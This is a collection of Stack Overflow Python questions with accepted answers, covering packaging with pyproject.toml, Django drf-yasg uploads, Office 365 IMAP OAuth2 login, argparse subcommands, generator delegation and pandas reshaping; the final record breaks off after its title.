    "Body": "Since mid 2022 it is now possible to get rid of setup.py, setup.cfg in favor of pyproject.toml. Editable installs work with recent versions of setuptools and pip and even the official packaging tutorial switched away from setup.py to pyproject.toml.\nHowever, documentation regarding requirements.txt seems to be have been also removed, and I wonder where to put the pinned requirements now?\nAs a refresher: It used to be common practice to put the dependencies (without version pinning) in setup.py avoiding issues when this package gets installed with other packages needing the same dependencies but with conflicting version requirements. For packaging libraries a setup.py was usually sufficient.\nFor deployments (i.e. non libraries) you usually also provided a requirements.txt with version-pinned dependencies. So you don't accidentally get the latest and greatest but the exact versions of dependencies that that package has been tested with.\nSo my question is, did anything change? Do you still put the pinned requirements in the requirements.txt when used together with pyproject.toml? Or is there an extra section\nfor that in pyproject.toml? Is there some documentation on that somewhere?\n",
    "AcceptedAnswerId": 74625055,
    "AcceptedAnswer": "Quoting myself from here\n\nMy current assumption is: [...] you put your (mostly unpinned) dependencies to pyproject.toml instead of setup.py, so you library can be installed as a dependency of something else without causing much troubles because of issues resolving version constraints.\n\n\nOn top of that, for \"deployable applications\" (for lack of a better term), you still want to maintain a separate requirements.txt with exact version pinning.\n\nWhich has been confirmed by a Python Packaging Authority (PyPA) member and clarification of PyPA's recommendations should be updated accordingly at some point.\n"
}
{
    "Id": 71319523,
    "PostTypeId": 1,
    "Title": "Django rest framework drf-yasg swagger multiple file upload error for ListField serializer",
    "Body": "I am trying to make upload file input from swagger (with drf-yasg), but when I use MultiPartParser class it gives me the below error:\ndrf_yasg.errors.SwaggerGenerationError: FileField is supported only in a formData Parameter or response Schema\n\nMy view:\nclass AddExperience(generics.CreateAPIView):\n    parser_classes = [MultiPartParser]\n\n    permission_classes = [IsAuthenticated]\n    serializer_class = DoctorExperienceSerializer\n\nMy serializer:\nclass DoctorExperienceSerializer(serializers.Serializer):\n    diploma = serializers.ListField(\n        child=serializers.FileField(allow_empty_file=False)\n    )\n    education = serializers.CharField(max_length=1000)\n    work_experience = serializers.CharField(max_length=1000)\n\nI also tried FormParser but it still gives me the same error. Also: FileUploadParser parser but it works like JsonParser:\n",
    "AcceptedAnswerId": 74684163,
    "AcceptedAnswer": "The OpenAPISchema (OAS) 2 doesn't support the multiple file upload (see issue #254); but OAS 3 supports it (you can use this YML spec on a live swagger editer (see this result)).\nComes to the real issue, there is a section in the drf-yasg's doc,\n\nIf you are looking to add Swagger/OpenAPI support to a new project you might want to take a look at drf-spectacular, which is an actively maintained new library that shares most of the goals of this project, while working with OpenAPI 3.0 schemas.\nOpenAPI 3.0 provides a lot more flexibility than 2.0 in the types of API that can be described. drf-yasg is unlikely to soon, if ever, get support for OpenAPI 3.0.\n\nThat means the package drf-yasg doesn't have support for OAS3 and thus, it won't support the \"multiple file upload\" feature.\nYou can consider migrating from drf-yasg to drf-spectacular. But, also note that, drf-spectacular is also dealing the FileUpload in a different way.\n"
}
{
    "Id": 74067547,
    "PostTypeId": 1,
    "Title": "Could not find poetry-1.2.2-linux.sha256sum file",
    "Body": "I am trying to update my version of Poetry to 1.2.*, but when running poetry self update I get the error Could not find poetry-1.2.2-linux.sha256sum file... I can't figure out how to try and update Poetry to an earlier version for which hopefully the checksum exists.\n",
    "AcceptedAnswerId": 74067692,
    "AcceptedAnswer": "You are trying to update a Poetry that was installed with the get-poetry.py installer. This installer is deprecated for more than a year now. Updating via poetry self update is not possible for these installation. Uninstall Poetry and reinstall with the recommended installer.\nMore information are available at https://python-poetry.org/blog/announcing-poetry-1.2.0/\n"
}
{
    "Id": 74798626,
    "PostTypeId": 1,
    "Title": "Why is log(inf + inf j) equal to (inf + 0.785398 j), In C++/Python/NumPy?",
    "Body": "I've been finding a strange behaviour of log functions in C++ and numpy about the behaviour of log function handling complex infinite numbers. Specifically, log(inf + inf * 1j) equals (inf + 0.785398j) when I expect it to be (inf + nan * 1j).\nWhen taking the log of a complex number, the real part is the log of the absolute value of the input and the imaginary part is the phase of the input. Returning 0.785398 as the imaginary part of log(inf + inf * 1j) means it assumes the infs in the real and the imaginary part have the same length.\nThis assumption does not seem to be consistent with other calculation, for example, inf - inf == nan, inf / inf == nan which assumes 2 infs do not necessarily have the same values.\nWhy is the assumption for log(inf + inf * 1j) different?\nReproducing C++ code:\n#include \n#include \n#include \nint main() {\n    double inf = std::numeric_limits::infinity();\n    std::complex b(inf, inf);\n    std::complex c = std::log(b);\n    std::cout << c << \"\\n\";\n}\n\nReproducing Python code (numpy):\nimport numpy as np\n\na = complex(float('inf'), float('inf'))\nprint(np.log(a))\n\nEDIT: Thank you for everyone who's involved in the discussion about the historical reason and the mathematical reason. All of you turn this naive question into a really interesting discussion. The provided answers are all of high quality and I wish I can accept more than 1 answers. However, I've decided to accept @simon's answer as it explains in more detail the mathematical reason and provided a link to the document explaining the logic (although I can't fully understand it).\n",
    "AcceptedAnswerId": 74799453,
    "AcceptedAnswer": "The value of 0.785398 (actually pi/4) is consistent with at least some other functions: as you said, the imaginary part of the logarithm of a complex number is identical with the phase angle of the number. This can be reformulated to a question of its own: what is the phase angle of inf + j * inf?\nWe can calculate the phase angle of a complex number z by atan2(Im(z), Re(z)). With the given number, this boils down to calculating atan2(inf, inf), which is also 0.785398 (or pi/4), both for Numpy and C/C++. So now a similar question could be asked: why is atan2(inf, inf) == 0.785398?\nI do not have an answer to the latter (except for \"the C/C++ specifications say so\", as others already answered), I only have a guess: as atan2(y, x) == atan(y / x) for x > 0, probably someone made the decision in this context to not interpret inf / inf as \"undefined\" but instead as \"a very large number divided by the same very large number\". The result of this ratio would be 1, and atan(1) == pi/4 by the mathematical definition of atan.\nProbably this is not a satisfying answer, but at least I could hopefully show that the log definition in the given edge case is not completely inconsistent with similar edge cases of related function definitions.\nEdit: As I said, consistent with some other functions: it is also consistent with np.angle(complex(np.inf, np.inf)) == 0.785398, for example.\nEdit 2: Looking at the source code of an actual atan2 implementation brought up the following code comment:\n\nnote that the non obvious cases are y and x both infinite or both zero. for more information, see Branch Cuts for Complex Elementary Functions, or Much Ado About Nothing's Sign Bit, by W. Kahan\n\nI dug up the referenced document, you can find a copy here. In Chapter 8 of this reference, called \"Complex zeros and infinities\", William Kahan (who is both mathematician and computer scientist and, according to Wikipedia, the \"Father of Floating Point\") covers the zero and infinity edge cases of complex numbers and arrives at pi/4 for feeding inf + j * inf into the arg function (arg being the function that calculates the phase angle of a complex number, just like np.angle above). You will find this result on page 17 in the linked PDF. I am not mathematician enough for being able to summarize Kahan's rationale (which is to say: I don't really understand it), but maybe someone else can.\n"
}
{
    "Id": 74012595,
    "PostTypeId": 1,
    "Title": "Why does code that in 3.10 throws a RecursionError as expected not throw in earlier versions?",
    "Body": "To start I tried this\ndef x():\n   try:\n      1/0 # just an division error to get an exception\n   except:\n      x()\n\nAnd this code behaves normally in 3.10 and I get RecursionError: maximum recursion depth exceeded as I expected but 3.8 goes into a stack overflow and doesn't handle the recursion error properly. But I did remember that there was RecursionError in older versions of Python too, so I tried\ndef x(): x()\n\nAnd this gives back RecursionError in both versions of Python.\nIt's as if (in the first snippet) the recursion error is never thrown in the except but the function called and then the error thrown at the first instruction of the function called but handled by the try-except.\nI then tried something else:\ndef x():\n   try:\n      x()\n   except:\n      x()\n\nThis is even weirder in some way, stack overflow below 3.10 but it get stuck in the loop in 3.10\nCan you explain this behavior?\nUPDATE\n@MisterMiyagi found a even stranger behavior, adding a statement in the except in  doesn't result in a stackoverflow\ndef x():\n   try:\n      1/0\n   except:\n      print(\"\")\n      x()\n\n",
    "AcceptedAnswerId": 74073476,
    "AcceptedAnswer": "The different behaviors for 3.10 and other versions seem to be because of a Python issue (python/cpython#86666), you can also see the correct error on Python 2.7.\nThe print \"fixes\" things because it makes Python check the recursion limit again, and through a path that is presumably not broken. You can see the code where it does that here, it also skips the repeated check if the object supports the Vectorcall calling protocol, so things like int keep the fatal error.\n"
}
{
    "Id": 73902642,
    "PostTypeId": 1,
    "Title": "Office 365 IMAP authentication via OAuth2 and python MSAL library",
    "Body": "I'm trying to upgrade a legacy mail bot to authenticate via Oauth2 instead of Basic authentication, as it's now deprecated two days from now.\nThe document states applications can retain their original logic, while swapping out only the authentication bit\n\nApplication developers who have built apps that send, read, or\notherwise process email using these protocols will be able to keep the\nsame protocol, but need to implement secure, Modern authentication\nexperiences for their users. This functionality is built on top of\nMicrosoft Identity platform v2.0 and supports access to Microsoft 365\nemail accounts.\n\nNote I've explicitly chosen the client credentials flow, because the documentation states\n\nThis type of grant is commonly used for server-to-server interactions\nthat must run in the background, without immediate interaction with a\nuser.\n\nSo I've got a python script that retrieves an Access Token using the MSAL python library. Now I'm trying to authenticate with the IMAP server, using that Access Token. There's some existing threads out there showing how to connect to Google, I imagine my case is pretty close to this one, except I'm connecting to a Office 365 IMAP server. Here's my script\nimport imaplib\nimport msal\nimport logging\n\napp = msal.ConfidentialClientApplication(\n    'client-id',\n    authority='https://login.microsoftonline.com/tenant-id',\n    client_credential='secret-key'\n)\n\nresult = app.acquire_token_for_client(scopes=['https://graph.microsoft.com/.default'])\n\ndef generate_auth_string(user, token):\n  return 'user=%s\\1auth=Bearer %s\\1\\1' % (user, token)\n\n# IMAP time!\nmailserver = 'outlook.office365.com'\nimapport = 993\nM = imaplib.IMAP4_SSL(mailserver,imapport)\nM.debug = 4\nM.authenticate('XOAUTH2', lambda x: generate_auth_string('user@mydomain.com', result['access_token']))\n\nprint(result)\n\nThe IMAP authentication is failing and despite setting M.debug = 4, the output isn't very helpful\n  22:56.53 > b'DBDH1 AUTHENTICATE XOAUTH2'\n  22:56.53 < b'+ '\n  22:56.53 write literal size 2048\n  22:57.84 < b'DBDH1 NO AUTHENTICATE failed.'\n  22:57.84 NO response: b'AUTHENTICATE failed.'\nTraceback (most recent call last):\n  File \"/home/ubuntu/mini-oauth.py\", line 21, in \n    M.authenticate(\"XOAUTH2\", lambda x: generate_auth_string('user@mydomain.com', result['access_token']))\n  File \"/usr/lib/python3.10/imaplib.py\", line 444, in authenticate\n    raise self.error(dat[-1].decode('utf-8', 'replace'))\nimaplib.IMAP4.error: AUTHENTICATE failed.\n\nAny idea where I might be going wrong, or how to get more robust information from the IMAP server about why the authentication is failing?\nThings I've looked at\n\nNote this answer no longer works as the suggested scopes fail to generate an Access Token.\n\nThe client credentials flow seems to mandate the https://graph.microsoft.com/.default grant. I'm not sure if that includes the scope required for the IMAP resource\nhttps://outlook.office.com/IMAP.AccessAsUser.All?\n\nVerified the code lifted from the Google thread produces the SASL XOAUTH2 string correctly, per example on the MS docs\n\n\nimport base64\n\nuser = 'test@contoso.onmicrosoft.com'\ntoken = 'EwBAAl3BAAUFFpUAo7J3Ve0bjLBWZWCclRC3EoAA'\n\nxoauth = \"user=%s\\1auth=Bearer %s\\1\\1\" % (user, token)\n\nxoauth = xoauth.encode('ascii')\nxoauth = base64.b64encode(xoauth)\nxoauth = xoauth.decode('ascii')\n\nxsanity = 'dXNlcj10ZXN0QGNvbnRvc28ub25taWNyb3NvZnQuY29tAWF1dGg9QmVhcmVyIEV3QkFBbDNCQUFVRkZwVUFvN0ozVmUwYmpMQldaV0NjbFJDM0VvQUEBAQ=='\n\nprint(xoauth == xsanity) # prints True\n\n\nThis thread seems to suggest multiple tokens need to be fetched, one for graph, then another for the IMAP connection; could that be what I'm missing?\n\n",
    "AcceptedAnswerId": 74131277,
    "AcceptedAnswer": "The imaplib.IMAP4.error: AUTHENTICATE failed Error occured because one point in the documentation is not that clear.\nWhen setting up the the Service Principal via Powershell you need to enter the App-ID and an Object-ID. Many people will think, it is the Object-ID you see on the overview page of the registered App, but its not!\nAt this point you need the Object-ID from \"Azure Active Directory -> Enterprise Applications --> Your-App --> Object-ID\"\nNew-ServicePrincipal -AppId  -ServiceId  [-Organization ]\n\nMicrosoft says:\n\nThe OBJECT_ID is the Object ID from the Overview page of the\nEnterprise Application node (Azure Portal) for the application\nregistration. It is not the Object ID from the Overview of the App\nRegistrations node. Using the incorrect Object ID will cause an\nauthentication failure.\n\nOfcourse you need to take care for the API-permissions and the other stuff, but this was for me the point.\nSo lets go trough it again, like it is explained on the documentation page.\nAuthenticate an IMAP, POP or SMTP connection using OAuth\n\nRegister the Application in your Tenant\nSetup a Client-Key for the application\nSetup the API permissions, select the APIs my organization uses tab and search for \"Office 365 Exchange Online\" -> Application permissions -> Choose IMAP and IMAP.AccessAsApp\nSetup the Service Principal and full access for your Application on the mailbox\nCheck if IMAP is activated for the mailbox\n\nThats the code I use to test it:\nimport imaplib\nimport msal\nimport pprint\n\nconf = {\n    \"authority\": \"https://login.microsoftonline.com/XXXXyourtenantIDXXXXX\",\n    \"client_id\": \"XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXXX\", #AppID\n    \"scope\": ['https://outlook.office365.com/.default'],\n    \"secret\": \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\", #Key-Value\n    \"secret-id\": \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\", #Key-ID\n}\n    \ndef generate_auth_string(user, token):\n    return f\"user={user}\\x01auth=Bearer {token}\\x01\\x01\"    \n\nif __name__ == \"__main__\":\n    app = msal.ConfidentialClientApplication(conf['client_id'], authority=conf['authority'],\n                                             client_credential=conf['secret'])\n\n    result = app.acquire_token_silent(conf['scope'], account=None)\n\n    if not result:\n        print(\"No suitable token in cache.  Get new one.\")\n        result = app.acquire_token_for_client(scopes=conf['scope'])\n\n    if \"access_token\" in result:\n        print(result['token_type'])\n        pprint.pprint(result)\n    else:\n        print(result.get(\"error\"))\n        print(result.get(\"error_description\"))\n        print(result.get(\"correlation_id\"))\n        \n    imap = imaplib.IMAP4('outlook.office365.com')\n    imap.starttls()\n    imap.authenticate(\"XOAUTH2\", lambda x: generate_auth_string(\"target_mailbox@example.com\", result['access_token']).encode(\"utf-8\"))\n\nAfter setting up the Service Principal and giving the App full access on the mailbox, wait 15 - 30 minutes for the changes to take effect and test it.\n"
}
{
    "Id": 74752610,
    "PostTypeId": 1,
    "Title": "How to use argparse to create command groups like git?",
    "Body": "I'm trying to figure out how to use properly builtin argparse module to get a similar output than tools\nsuch as git where I can display a nice help with all \"root commands\" nicely grouped, ie:\n$ git --help\nusage: git [--version] [--help] [-C ] [-c =]\n           [--exec-path[=]] [--html-path] [--man-path] [--info-path]\n           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]\n           [--git-dir=] [--work-tree=] [--namespace=]\n           [--super-prefix=] [--config-env==]\n            []\n\nThese are common Git commands used in various situations:\n\nstart a working area (see also: git help tutorial)\n   clone     Clone a repository into a new directory\n   init      Create an empty Git repository or reinitialize an existing one\n\nwork on the current change (see also: git help everyday)\n   add       Add file contents to the index\n   mv        Move or rename a file, a directory, or a symlink\n   restore   Restore working tree files\n   rm        Remove files from the working tree and from the index\n\nexamine the history and state (see also: git help revisions)\n   bisect    Use binary search to find the commit that introduced a bug\n   diff      Show changes between commits, commit and working tree, etc\n   grep      Print lines matching a pattern\n   log       Show commit logs\n   show      Show various types of objects\n   status    Show the working tree status\n\ngrow, mark and tweak your common history\n   branch    List, create, or delete branches\n   commit    Record changes to the repository\n   merge     Join two or more development histories together\n   rebase    Reapply commits on top of another base tip\n   reset     Reset current HEAD to the specified state\n   switch    Switch branches\n   tag       Create, list, delete or verify a tag object signed with GPG\n\ncollaborate (see also: git help workflows)\n   fetch     Download objects and refs from another repository\n   pull      Fetch from and integrate with another repository or a local branch\n   push      Update remote refs along with associated objects\n\n'git help -a' and 'git help -g' list available subcommands and some\nconcept guides. See 'git help ' or 'git help '\nto read about a specific subcommand or concept.\nSee 'git help git' for an overview of the system.\n\nHere's my attempt:\nfrom argparse import ArgumentParser\n\n\nclass FooCommand:\n    def __init__(self, subparser):\n        self.name = \"Foo\"\n        self.help = \"Foo help\"\n        subparser.add_parser(self.name, help=self.help)\n\n\nclass BarCommand:\n    def __init__(self, subparser):\n        self.name = \"Bar\"\n        self.help = \"Bar help\"\n        subparser.add_parser(self.name, help=self.help)\n\n\nclass BazCommand:\n    def __init__(self, subparser):\n        self.name = \"Baz\"\n        self.help = \"Baz help\"\n        subparser.add_parser(self.name, help=self.help)\n\n\ndef test1():\n    parser = ArgumentParser(description=\"Test1 ArgumentParser\")\n    root = parser.add_subparsers(dest=\"command\", description=\"All Commands:\")\n\n    # Group1\n    FooCommand(root)\n    BarCommand(root)\n\n    # Group2\n    BazCommand(root)\n\n    args = parser.parse_args()\n    print(args)\n\n\ndef test2():\n    parser = ArgumentParser(description=\"Test2 ArgumentParser\")\n\n    # Group1\n    cat1 = parser.add_subparsers(dest=\"command\", description=\"Category1 Commands:\")\n    FooCommand(cat1)\n    BarCommand(cat1)\n\n    # Group2\n    cat2 = parser.add_subparsers(dest=\"command\", description=\"Category2 Commands:\")\n    BazCommand(cat2)\n\n    args = parser.parse_args()\n    print(args)\n\nIf you run test1 you'd get:\n$ python mcve.py --help\nusage: mcve.py [-h] {Foo,Bar,Baz} ...\n\nTest1 ArgumentParser\n\noptions:\n  -h, --help     show this help message and exit\n\nsubcommands:\n  All Commands:\n\n  {Foo,Bar,Baz}\n    Foo          Foo help\n    Bar          Bar help\n    Baz          Baz help\n\nObviously this is not what I want, in there I just see all commands in a flat list, no groups or whatsoever... so the next logical attempt would be trying to group them. But if I run test2 I'll get:\n$ python mcve.py --help\nusage: mcve.py [-h] {Foo,Bar} ...\nmcve.py: error: cannot have multiple subparser arguments\n\nWhich obviously means I'm not using properly argparse to accomplish the task at hand. So, is it possible to use argparse to achieve a similar behaviour than git? In the past I've relied on \"hacks\" so I thought the best practice here would be using the concept of add_subparsers but it seems I didn't understand properly that concept.\n",
    "AcceptedAnswerId": 74772609,
    "AcceptedAnswer": "This isn't supported natively by argparse -- you can't nest subparsers, so if you want this sort of cli using argparse you're going to need to build a lot of logic on top of argparse. You can set nargs=argparse.REMAINDER to collect a subcommand and arguments without having them parsed by argparse, which means we can build something like this:\nimport argparse\nimport copy\n\n\nclass Command:\n    def __init__(self):\n        self.subcommands = {}\n        self.parser = argparse.ArgumentParser()\n\n    def add_subcommand(self, name, sub):\n        self.subcommands[name] = sub\n\n    def add_argument(self, *args, **kwargs):\n        return self.parser.add_argument(*args, **kwargs)\n\n    def parse_args(self, args=None):\n        if not self.subcommands:\n            args = self.parser.parse_args(args)\n            return args\n\n        p = copy.deepcopy(self.parser)\n        p.add_argument(\"subcommand\")\n        p.add_argument(\"args\", nargs=argparse.REMAINDER)\n        args = p.parse_args(args)\n\n        try:\n            sub = self.subcommands[args.subcommand]\n        except KeyError:\n            return self.parser.parse_args(args)\n\n        sub_args = sub.parse_args(args.args)\n\n        for attr in dir(sub_args):\n            if attr.startswith(\"_\"):\n                continue\n            setattr(args, attr, getattr(sub_args, attr))\n\n        return args\n\n\ndef main():\n    root = Command()\n    root.add_argument(\"-v\", \"--verbose\", action=\"count\")\n\n    cmd1 = Command()\n    cmd1_foo = Command()\n    cmd1_foo.add_argument(\"-n\", \"--name\")\n    cmd1.add_subcommand(\"foo\", cmd1_foo)\n    root.add_subcommand(\"cmd1\", cmd1)\n\n    cmd2 = Command()\n    cmd2_bar = Command()\n    cmd2_bar.add_argument(\"-s\", \"--size\", type=int)\n    cmd2.add_subcommand(\"bar\", cmd2_bar)\n    root.add_subcommand(\"cmd2\", cmd2)\n\n    print(root.parse_args())\n\n\nif __name__ == \"__main__\":\n    main()\n\nThis is horrible and ugly and poorly structured, but it means we can do this:\n$ python argtest.py --verbose cmd1 foo --name lars\nNamespace(verbose=1, subcommand='foo', args=['--name', 'lars'], name='lars')\n\nOr this:\n$ python argtest.py --verbose cmd2 bar --size 10\nNamespace(verbose=1, subcommand='bar', args=['--size', '10'], size=10)\n\n\nIf you're willing to look beyond argparse, libraries like Click and Typer make things much easier. For example, the above command could be implemented using Click like this:\nimport click\n\n@click.group()\ndef main():\n    pass\n\n@main.group()\ndef cmd1():\n    pass\n\n@cmd1.command()\n@click.option('-n', '--name')\ndef foo(name):\n    pass\n\n@main.group()\ndef cmd2():\n    pass\n\n\n@cmd2.command()\n@click.option('-s', '--size', type=int)\ndef bar():\n    pass\n\nif __name__ == '__main__':\n    main()\n\nSo much nicer!\n"
}
{
    "Id": 74922314,
    "PostTypeId": 1,
    "Title": "yield from vs yield in for-loop",
    "Body": "My understanding of yield from is that it is similar to yielding every item from an iterable. Yet, I observe the different behavior in the following example.\nI have Class1\nclass Class1:\n    def __init__(self, gen):\n        self.gen = gen\n        \n    def __iter__(self):\n        for el in self.gen:\n            yield el\n\nand Class2 that different only in replacing yield in for loop with yield from\nclass Class2:\n    def __init__(self, gen):\n        self.gen = gen\n        \n    def __iter__(self):\n        yield from self.gen\n\nThe code below reads the first element from an instance of a given class and then reads the rest in a for loop:\na = Class1((i for i in range(3)))\nprint(next(iter(a)))\nfor el in iter(a):\n    print(el)\n\nThis produces different outputs for Class1 and Class2. For Class1 the output is\n0\n1\n2\n\nand for Class2 the output is\n0\n\nLive demo\nWhat is the mechanism behind yield from that produces different behavior?\n",
    "AcceptedAnswerId": 74923483,
    "AcceptedAnswer": "What Happened?\nWhen you use next(iter(instance_of_Class2)), iter() calls .close() on the inner generator when it (the iterator, not the generator!) goes out of scope (and is deleted), while with Class1, iter() only closes its instance\n>>> g = (i for i in range(3))\n>>> b = Class2(g)\n>>> i = iter(b)     # hold iterator open\n>>> next(i)\n0\n>>> next(i)\n1\n>>> del(i)          # closes g\n>>> next(iter(b))\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\nThis behavior is described in PEP 342 in two parts\n\nthe new .close() method (well, new to Python 2.5)\nfrom the Specification Summary\n\n\nAdd support to ensure that close() is called when a generator iterator is garbage-collected.\n\n\n\n\nWhat happens is a little clearer (if perhaps surprising) when multiple generator delegations occur; only the generator being delegated is closed when its wrapping iter is deleted\n>>> g1 = (a for a in range(10))\n>>> g2 = (a for a in range(10, 20))\n>>> def test3():\n...     yield from g1\n...     yield from g2\n... \n>>> next(test3())\n0\n>>> next(test3())\n10\n>>> next(test3())\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\n\nFixing Class2\nWhat options are there to make Class2 behave more the way you expect?\nNotably, other strategies, though they don't have the visually pleasing sugar of yield from or some of its potential benefits gives you a way to interact with the values, which seems like a primary benefit\n\navoid creating a structure like this at all (\"just don't do that!\")\nif you don't interact with the generator and don't intend to keep a reference to the iterator, why bother wrapping it at all? (see above comment about interacting)\ncreate the iterator yourself internally (this may be what you expected)\n>>> class Class3:\n...     def __init__(self, gen):\n...         self.iterator = iter(gen)\n...         \n...     def __iter__(self):\n...         return self.iterator\n... \n>>> c = Class3((i for i in range(3)))\n>>> next(iter(c))\n0\n>>> next(iter(c))\n1\n\n\nmake the whole class a \"proper\" Generator\nwhile testing this, it plausibly highlights some iter() inconsistency - see comments below (ie. why isn't e closed?)\nalso an opportunity to pass multiple generators with itertools.chain.from_iterable\n>>> class Class5(collections.abc.Generator):\n...     def __init__(self, gen):\n...         self.gen = gen\n...     def send(self, value):\n...         return next(self.gen)\n...     def throw(self, value):\n...         raise StopIteration\n...     def close(self):          # optional, but more complete\n...         self.gen.close()\n... \n>>> e = Class5((i for i in range(10)))\n>>> next(e)        # NOTE iter is not necessary!\n0\n>>> next(e)\n1\n>>> next(iter(e))  # but still works\n2\n>>> next(iter(e))  # doesn't close e?? (should it?)\n3\n>>> e.close()\n>>> next(e)\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"/usr/lib/python3.9/_collections_abc.py\", line 330, in __next__\n    return self.send(None)\n  File \"\", line 5, in send\nStopIteration\n\n\n\n\nHunting the Mystery\nA better clue is that if you directly try again, next(iter(instance)) raises StopIteration, indicating the generator is permanently closed (either through exhaustion or .close()), and why iterating over it with a for loop yields no more values\n>>> a = Class1((i for i in range(3)))\n>>> next(iter(a))\n0\n>>> next(iter(a))\n1\n>>> b = Class2((i for i in range(3)))\n>>> next(iter(b))\n0\n>>> next(iter(b))\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\nHowever, if we name the iterator, it works as expected\n>>> b = Class2((i for i in range(3)))\n>>> i = iter(b)\n>>> next(i)\n0\n>>> next(i)\n1\n>>> j = iter(b)\n>>> next(j)\n2\n>>> next(i)\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\nTo me, this suggests that when the iterator doesn't have a name, it calls .close() when it goes out of scope\n>>> def gen_test(iterable):\n...     yield from iterable\n... \n>>> g = gen_test((i for i in range(3)))\n>>> next(iter(g))\n0\n>>> g.close()\n>>> next(iter(g))\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\nDisassembling the result, we find the internals are a little different\n>>> a = Class1((i for i in range(3)))\n>>> dis.dis(a.__iter__)\n  6           0 LOAD_FAST                0 (self)\n              2 LOAD_ATTR                0 (gen)\n              4 GET_ITER\n        >>    6 FOR_ITER                10 (to 18)\n              8 STORE_FAST               1 (el)\n\n  7          10 LOAD_FAST                1 (el)\n             12 YIELD_VALUE\n             14 POP_TOP\n             16 JUMP_ABSOLUTE            6\n        >>   18 LOAD_CONST               0 (None)\n             20 RETURN_VALUE\n>>> b = Class2((i for i in range(3)))\n>>> dis.dis(b.__iter__)\n  6           0 LOAD_FAST                0 (self)\n              2 LOAD_ATTR                0 (gen)\n              4 GET_YIELD_FROM_ITER\n              6 LOAD_CONST               0 (None)\n              8 \n             10 POP_TOP\n             12 LOAD_CONST               0 (None)\n             14 RETURN_VALUE\n\nNotably, the yield from version has GET_YIELD_FROM_ITER\n\nIf TOS is a generator iterator or coroutine object it is left as is. Otherwise, implements TOS = iter(TOS).\n\n(subtly, YIELD_FROM keyword appears to be removed in 3.11)\nSo if the given iterable (to the class) is a generator iterator, it'll be handed off directly, giving the result we (might) expect\n\nExtras\nPassing an iterator which isn't a generator (iter() creates a new iterator each time in both cases)\n>>> a = Class1([i for i in range(3)])\n>>> next(iter(a))\n0\n>>> next(iter(a))\n0\n>>> b = Class2([i for i in range(3)])\n>>> next(iter(b))\n0\n>>> next(iter(b))\n0\n\nExpressly closing Class1's internal generator\n>>> g = (i for i in range(3))\n>>> a = Class1(g)\n>>> next(iter(a))\n0\n>>> next(iter(a))\n1\n>>> a.gen.close()\n>>> next(iter(a))\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\ngenerator is only closed by iter when deleted if instance is popped\n>>> g = (i for i in range(10))\n>>> b = Class2(g)\n>>> i = iter(b)\n>>> next(i)\n0\n>>> j = iter(b)\n>>> del(j)        # next() not called on j\n>>> next(i)\n1\n>>> j = iter(b)\n>>> next(j)\n2\n>>> del(j)        # generator closed\n>>> next(i)       # now fails, despite range(10) above\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\n"
}
{
    "Id": 74893662,
    "PostTypeId": 1,
    "Title": "Transpose pandas DF based on value data type",
    "Body": "I have pandas DataFrame A. I am struggling transforming this into my desired format, see DataFrame B. I tried pivot or melt but I am not sure how I could make it conditional (string values to FIELD_STR_VALUE, numeric values to FIELD_NUM_VALUE). I was hoping you could point me the right direction.\nA: Input DataFrame\n|FIELD_A |FIELD_B |FIELD_C |FIELD_D |\n|--------|--------|--------|--------|\n|123123  |8       |a       |23423   |\n|123124  |7       |c       |6464    |\n|123144  |99      |x       |234     |\n\nB: Desired output DataFrame\n|ID |FIELD_A |FIELD_NAME |FIELD_STR_VALUE |FIELD_NUM_VALUE |\n|---|--------|-----------|----------------|----------------|\n|1  |123123  |B          |                |8               |\n|2  |123123  |C          |a               |                |\n|3  |123123  |D          |                |23423           |\n|4  |123124  |B          |                |7               |\n|5  |123124  |C          |c               |                |\n|6  |123124  |D          |                |6464            |\n|7  |123144  |B          |                |99              |\n|8  |123144  |C          |x               |                |\n|9  |123144  |D          |                |234             |\n\n",
    "AcceptedAnswerId": 74893842,
    "AcceptedAnswer": "You can use:\n# dic = {np.int64: 'NUM', object: 'STR'}\n\n(df.set_index('FIELD_A')\n   .pipe(lambda d: d.set_axis(pd.MultiIndex.from_arrays(\n          [d.columns, d.dtypes],\n         # or for custom NAMES\n         #[d.columns, d.dtypes.map(dic)],\n                              names=['FIELD_NAME', None]),\n                              axis=1)\n        )\n   .stack(0).add_prefix('FIELD_').add_suffix('_VALUE')\n   .reset_index()\n)\n\nNB. if you really want STR/NUM, map those strings from the dtypes (see comments in code).\nOutput:\n   FIELD_A FIELD_NAME  FIELD_int64_VALUE FIELD_object_VALUE\n0   123123    FIELD_B                8.0                NaN\n1   123123    FIELD_C                NaN                  a\n2   123123    FIELD_D            23423.0                NaN\n3   123124    FIELD_B                7.0                NaN\n4   123124    FIELD_C                NaN                  c\n5   123124    FIELD_D             6464.0                NaN\n6   123144    FIELD_B               99.0                NaN\n7   123144    FIELD_C                NaN                  x\n8   123144    FIELD_D              234.0                NaN\n\n"
}
{
    "Id": 74057367,
    "PostTypeId": 1,
    "Title": "How to get rid of the in place FutureWarning when setting an entire column from an array?",
